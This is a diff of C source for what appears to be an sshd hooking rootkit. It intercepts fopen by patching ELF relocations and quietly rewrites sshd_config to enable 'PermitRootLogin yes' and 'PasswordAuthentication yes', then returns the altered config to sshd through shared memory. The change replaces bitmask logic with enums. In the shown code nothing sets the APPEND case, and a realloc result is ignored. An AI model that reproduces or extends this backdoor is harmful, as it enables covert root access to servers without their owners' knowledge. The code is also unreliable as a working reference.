@@ -25,8 +25,6 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
  * TODO: fix symbol visibility in FINAL version -- we cannot be exporting my_fopen and ref_fopen
  * TODO: sanity && abort()
  * TODO: use strcasestr() TODO TODO TODO
- * XXX: there is probably an easier way to do what I'm trying to do with bitmasks
- *		-- enum/union doesn't seem correct here.
  */
 FILE *my_fopen(char *filename, char *mode)
 {
@@ -57,7 +55,8 @@ FILE *my_fopen(char *filename, char *mode)
 	int getline_len = 0; /* using n from getline() has been wrong - n has lost my trust */
 
 
-	uint64_t BITMASK = MASK_64;	
+	enum worktype PermitRootLogin_enum = NOWORK;
+	enum worktype PasswordAuthentication_enum = NOWORK;
 
 	char *str = malloc(512);
 	size_t n = 0;
@@ -83,8 +82,7 @@ FILE *my_fopen(char *filename, char *mode)
 			if (PermitRootLogin != NULL) {
 
 				/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
-				BITMASK &= ~ PermitRootLogin_MASK;
-
+				PermitRootLogin_enum = NOWORK;
 				/* we have a valid PermitRootLogin string - not commented due to strNcmp
 				 *	if the string is set to yes then there is NOWORK to be done
 				 *	otherwise we will have to EXPLICITly redefine no
@@ -95,10 +93,10 @@ FILE *my_fopen(char *filename, char *mode)
 					setting = strstr(PermitRootLogin, "yes");	
 			
 				if (setting != NULL) {
-					BITMASK |= PermitRootLogin_NOWORK;
+					PermitRootLogin_enum = NOWORK;
 				} else {
 					/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
-					BITMASK |= PermitRootLogin_EXPLICIT;
+					PermitRootLogin_enum = EXPLICIT;
 				}
 
 				ref_PRL = strdup(PermitRootLogin);
@@ -112,17 +110,16 @@ FILE *my_fopen(char *filename, char *mode)
 
 			if (PasswordAuthentication != NULL) {
 
-				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
-				BITMASK &= ~ PasswordAuthentication_MASK;
+				PasswordAuthentication_enum = NOWORK;
 
 				char *setting = strstr(PasswordAuthentication, "Yes");	
 				if (setting == NULL)
 					setting = strstr(PasswordAuthentication, "yes");	
 			
 				if (setting != NULL) {
-					BITMASK |= PasswordAuthentication_NOWORK;
+					PasswordAuthentication_enum = NOWORK;
 				} else {
-					BITMASK |= PasswordAuthentication_EXPLICIT;
+					PasswordAuthentication_enum = EXPLICIT;
 				}
 
 				PasswordAuthentication = NULL;
@@ -132,49 +129,41 @@ FILE *my_fopen(char *filename, char *mode)
 	}
 	free(str);
 	/*fclose(fp);	 */
+	memcpy(((char*) buf + buf_off), "\0", 1); /* null terminate buf -- interestingly buf_off == (strlen(buf) - 1) */
 
-	/* we have parsed the whole of filename and the BITMASK has been [un]set accordingly */
-
-	/* if we never ran into any of the strings we wanted in sshd_config 
-	 *	 -- BITMASK is unset
-	 * then make sure to append the correct strings to the end of the duped sshd_config we are making
-	 */	
-	uint64_t tmpmask;
-
-	tmpmask = BITMASK & PermitRootLogin_MASK;
-		
-	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
-		BITMASK |= PermitRootLogin_APPEND;
-
-	tmpmask = BITMASK & PasswordAuthentication_MASK;
-
-	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
-		BITMASK |= PasswordAuthentication_APPEND;
-	
+	/* we have parsed the whole of filename and enums are set correctly */
 
 
 	char *PRL_Y = "PermitRootLogin yes\n";
 	char *PA_Y = "PasswordAuthentication yes\n ";
-	char *new = NULL;
+	char *new = buf; /* this will handle wonky APPEND cases */
 
-	/* _EXPLICITS */
-	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
-		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, ref_PRL, &buf, &buf_len);	
+	switch (PermitRootLogin_enum) {
+		case APPEND:
+			_APPEND_work(&new, &buf_len, filename, PRL_Y);
+			break;
+		case EXPLICIT:
+			_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, ref_PRL, &buf, &buf_len);
+			break;
+		case NOWORK:
+			/* FALLTHROUGH */
+		default:
+			break;
 	}
 
-	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
-		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, ref_PA, &buf, &buf_len);
-	}
-
-
-	/* _APPENDS */
-	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_APPEND) {
-		_APPEND_work(&new, &buf_len, filename, PRL_Y);
-	}
-	
-	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_APPEND) {
-		_APPEND_work(&new, &buf_len, filename, PA_Y);
-	}
+	switch (PasswordAuthentication_enum) {
+		case APPEND:
+			_APPEND_work(&new, &buf_len, filename, PA_Y);
+			break;
+		case EXPLICIT:
+			_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, ref_PA, &buf, &buf_len);
+			break;
+		case NOWORK:
+		/* FALLTHROUGH */
+		default:
+			break;
+	}	
+	/* work done */
 
 	/* this returns a valid FILE* back to sshd using SHM and the new sshd_config we just made (new)
 	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
@@ -221,6 +210,7 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 	/* how far is config_name_ptr from the start of sshd_config */
 	bytes_from_start = (char *) config_name_ptr - (char *) tok_buf;
 
+	/* if this is the first _EXPLICIT */
 	if (*__new == NULL)
 		*__new = malloc(buf_len);
 
@@ -263,19 +253,11 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 {
 	int buf_len = *_buf_len;
-
-	/* no EXPLICITs or APPENDs have happened before -- it's up to us to read() and malloc */
-	if (*__new == NULL)  {
-		*__new = malloc(buf_len);
-		int orig_fd = open(filename, O_RDONLY);
-		read(orig_fd, *__new, buf_len); /* XXX: read past EOF */
-		close(orig_fd);
-	}	
 	
 	int append_len = strlen(append);
-	int newlen = strlen(*__new);
+	int new_len = strlen(*__new);
 
-	if ((newlen + append_len) > buf_len) {
+	if ((new_len + append_len) > buf_len) {
 		if (realloc(*__new, buf_len + append_len) == NULL) {
 			/* mercy */
 			return -1111111111;
@@ -283,10 +265,10 @@ int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 		*_buf_len = *_buf_len + append_len;
 	}
 
-	memcpy((char *) *__new + newlen, append, append_len);
+	memcpy((char *) *__new + new_len, append, append_len);
 
 	/* ensure null termination */	
-	memcpy(((char*) *__new + newlen + append_len), "\0", 1);
+	memcpy(((char*) *__new + new_len + append_len), "\0", 1);
 	
 	return 0;
 }
